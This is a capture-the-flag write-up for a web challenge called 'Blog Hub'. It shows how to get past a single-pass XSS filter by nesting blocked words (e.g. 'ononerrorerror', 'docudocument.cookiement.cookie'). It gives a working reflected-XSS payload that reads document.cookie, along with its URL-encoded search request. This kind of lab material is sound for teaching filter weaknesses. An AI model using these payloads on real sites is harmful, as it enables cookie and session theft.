---
title: "Blog Hub — WAF Bypass XSS"
category: web
platform: —
difficulty: —
points: 100
solves: 39
flag: "[REDACTED]"
author: "mr.p4rr0t"
tags:
  - "mr.p4rr0t"
  - "ctf"
  - "web"
  - "bunabyte"
---

# Blog Hub — WAF Bypass XSS

> **Author:** mr.p4rr0t • **Tag:** `#mr.p4rr0t`

![Blog Hub](../../pics/blog%20hub.png)

> A blog platform protected by a Web Application Firewall that strips malicious tags, event handlers, and JavaScript functions. Bypass the filter and read the flag.

**Flag:** `[REDACTED]`

## Challenge

A multi-page blog platform with articles, a comment system, and a search feature. A WAF strips `<script>` tags, `on*` event handlers, and JavaScript function names. The goal is to bypass the single-pass filter and exfiltrate the visitor's cookie, which contains the flag.

## Reconnaissance

### Key endpoints

```
/                     — Home page (lists articles)
/post/{1,2,3}         — Individual articles with comment forms
/search?q=            — Search across comments, query reflected on page
```

### Reflection point (XSS vector)

The search term is reflected inside a `<span>` tag in the page:

```html
<h3 class="search-results-title">Results for: <span>USER_INPUT</span></h3>
```

No HTML encoding is applied — user input passes through directly.

### Comment system (stored XSS vector)

Each article has a comment form with `name` and `text` fields, stored and rendered on the page. The form notes "Filtered for security."

## Filter Analysis

Sending various payloads reveals what survives the filter:

| Payload | Result | Conclusion |
|---|---|---|
| `<b>test</b>` | `<b>test</b>` | Basic HTML tags pass through |
| `<script>alert(1)</script>` | `>` | `<script` is stripped |
| `<img src=x onerror=alert(1)>` | `<img src="x" =1)="">` | `onerror` and `alert` stripped |
| `alert(123)` | `123` | `alert(` is blocked (parenthesis matters) |
| `alert` (no parens) | `alert` | Not blocked alone |
| `document.cookie` | (empty) | Blocked as complete phrase |
| `onclick` | (empty) | Event handlers blocked |
| `javascript:` | `javascript:` | Not blocked |
| `fetch` | `fetch` | Not blocked |

### Blocked words identified

- `<script` (opening script tag with bracket, case-insensitive)
- `alert(` (function name followed by parenthesis)
- `document.cookie`
- All `on*` event handlers (`onerror`, `onclick`, `onfocus`, etc.)

### Filter behavior

The filter scans the input **once from left to right**, deleting blocked words as it encounters them. It does **not recursively re-scan** after deletion.

## The Bypass: Nested Word Trick

The hint stated: *"If a filter only deletes a blocked word once from left to right, what happens if you embed a blocked word inside another blocked word?"*

If a blocked word appears as a substring inside a larger word, and the filter removes the inner occurrence, the outer framing characters concatenate to re-form the blocked word. Since the filter does not re-scan, the re-formed word survives.

### Examples

```
ononerrorerror
    ^^^^^^^     <-- filter finds "onerror" here, deletes it
on      error   <-- remaining characters concatenate
onerror         <-- blocked word reconstructed!

docudocument.cookiement.cookie
      ^^^^^^^^^^^^^^^^   <-- filter finds "document.cookie", deletes it
docu            ment.cookie   <-- concatenated
document.cookie              <-- blocked word reconstructed!
```

### Proof of concept

```
Input:  alalert(ert(x)
Output: alert(x)
```

The filter removed the inner `alert(`, and the remaining `al` + `ert(` formed `alert(`.

## Crafting the Exploit

### Required bypasses

| Desired | Nested bypass |
|---|---|
| `onerror` | `ononerrorerror` |
| `document.cookie` | `docudocument.cookiement.cookie` |

### Payload

The goal is to exfiltrate `document.cookie`. Since `alert()` is blocked (and useless in headless environments anyway), write the cookie value into the page heading instead:

```html
<img src=x ononerrorerror="document.querySelector('h3').innerText=docudocument.cookiement.cookie">
```

### Filter transformation

The server processes this once, left to right:

1. Finds `onerror` inside `ononerrorerror` → removes it → `onerror`
2. Finds `document.cookie` inside `docudocument.cookiement.cookie` → removes it → `document.cookie`

Result:

```html
<img src=x onerror="document.querySelector('h3').innerText=document.cookie">
```

The `src=x` is a broken image URL → triggers `onerror` → JavaScript executes.

## Execution

URL-encoded and sent via the search endpoint:

```
/search?q=%3Cimg%20src%3Dx%20ononerrorerror%3D%22document.querySelector%28%27h3%27%29.innerText%3Ddocudocument.cookiement.cookie%22%3E
```

The page heading updated to show:

```
flag=[REDACTED]; _ga=GA1.1.1448852271.1784471407; ...
```

## Flag

```
[REDACTED]
```

## Key Takeaways

- **Single-pass WAF bypass**: filters that delete blocked words in one left-to-right pass are vulnerable to nesting attacks. Embed the blocked word inside a larger word; deletion of the inner instance reconstructs the outer one.
- **Always test filter boundaries**: try each blocked word independently, then with and without context (parentheses, attribute names) to understand the exact filter rules.
- **Reflected XSS still works**: even without an admin bot, reflected XSS can reveal client-side data like cookies.
